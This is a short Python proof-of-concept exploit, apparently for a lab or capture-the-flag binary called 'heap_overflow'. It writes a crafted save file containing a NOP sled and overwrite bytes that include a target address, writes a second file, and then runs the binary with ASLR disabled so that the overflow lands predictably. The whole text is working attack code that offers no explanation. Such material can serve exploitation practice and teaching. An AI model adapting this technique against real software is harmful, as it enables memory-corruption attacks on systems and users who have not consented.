#!/usr/bin/env python3

import subprocess as sp

with open("save1.db", "wb") as f:
    f.write(b'\x20')
    f.write((b'\x90' * 20) + b'\x55\x55\x55\x55\x10\x80')

with open("save2.db", "wb") as f:
    f.write(b'\x00')

# Use setarch for disabling ASLR
sp.run(['setarch', '-R', './heap_overflow', 'save1.db', 'save2.db'])
